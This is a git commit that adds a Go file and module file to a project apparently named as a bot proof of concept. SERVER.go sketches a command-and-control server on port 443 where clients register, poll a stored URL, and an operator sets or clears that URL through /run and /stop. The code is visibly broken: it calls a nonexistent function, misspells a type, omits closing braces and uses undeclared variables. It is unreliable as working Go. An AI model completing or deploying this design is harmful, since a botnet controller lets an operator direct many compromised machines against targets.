8f2008625caf04a3bb6b209543216b5730df0e51
fegice <teplovvaceslpv@gmail.com>
2026-07-18 13:36:41 +0300

    Add files via upload

---
+++ SERVER.go
@@ -0,0 +1,28 @@
+package main
+import(
+	"net/http"
+	"fmt"
+)
+
+var url string = "none"
+
+func main(){
+	http.FuncHandler("/register", register)
+	http.FuncHandler("/check", check)
+	http.HandleFunc("/run", run)
+	http.HandleFunc("/stop", stop)
+
+	http.ListenAndServe(":443", nil)
+}
+
+func register(w http.ResponseWriter, r *http.Request){
+	fmt.Println("Новый клиент подключился.")
+
+func check(w http.ReponseWriter, r *http.Request){
+	fmt.Fprintf(url)
+
+func run(){
+	url = r.FormValue("url")
+
+func stop(){
+	url = "none"	
---
+++ go.mod
@@ -0,0 +1,3 @@
+module BoTPoC
+
+go 1.26.5
